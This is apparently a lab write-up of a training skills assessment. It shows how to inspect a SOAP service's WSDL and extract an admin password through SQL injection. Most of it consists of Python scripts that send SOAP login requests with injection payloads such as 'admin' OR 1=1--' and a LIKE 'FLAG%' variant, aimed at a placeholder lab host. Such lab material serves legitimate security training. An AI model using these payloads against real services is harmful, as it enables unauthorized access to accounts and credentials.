# Skills Assessment

#### Our client tasks us with assessing a SOAP web service whose WSDL file resides at `http://<TARGET IP>:3002/wsdl?wsdl`.

#### Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below.

#### Submit the password of the user that has a username of "admin". Answer format: FLAG{string}. Please note that the service will respond successfully only after submitting the proper SQLi payload, otherwise it will hang or throw an error.



The first step is to analyse carefully the WSDL file. We can retrieve the file with the command `curl http://SERVER_IP:PORT/wsdl?wsdl > wsdl.txt`. This way we can inspect carefully the WSDL file.

Then the next step is to find the correct `soapAction`.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

There are only two `soapActions` in the file, so we identified the **Login** that is related to this skills assessment.

Then we'll take a look of it's parameters located in **LoginRequest** in the data types.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

And now we've identified the parameters **username** and **password**.

The next step is to make a python script to send our payload. This will be a very straightforward demonstration, since the application hangs when is not expecting the correct input.&#x20;

<pre class="language-python" data-overflow="wrap"><code class="lang-python"><strong>import requests
</strong>
payload = '&#x3C;?xml version="1.0" encoding="utf-8"?>&#x3C;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">&#x3C;soap:Body>&#x3C;LoginRequest xmlns="http://tempuri.org/">&#x3C;username>username&#x3C;/username>&#x3C;password>password&#x3C;/password>&#x3C;/LoginRequest>&#x3C;/soap:Body>&#x3C;/soap:Envelope>'

print(requests.post("http://SERVER_IP:PORT/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)

</code></pre>

The SQLi payload we have to use is `admin' OR 1=1--`. In order to not break the script we have to add two aditional single quotes at the end and the beginning of the payload. Like this:

{% code overflow="wrap" %}
```python
import requests

payload = '''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin' OR 1=1--</username><password>password</password></LoginRequest></soap:Body></soap:Envelope>'''

print(requests.post("http://SERVER_IP:PORT/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
```
{% endcode %}

Let's send the payload to see if it works.

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

And it looks we got something. We got a username and a hashed password string. Now that we our payload working, lets try to retrieve the flag. We will add `LIKE 'FLAG%'` to search for values that start with "FLAG".

{% code overflow="wrap" %}
```python
import requests

payload = '''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin' OR 1=1 LIKE 'FLAG%' --</username><password>password</password></LoginRequest></soap:Body></soap:Envelope>'''

print(requests.post("http://SERVER_IP:PORT/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

And we founded it! \
This section was a totally new concept, since i never programmed any kind of web service. But it was fun to learn and to having a SQLi mix in this Skills Assessment.
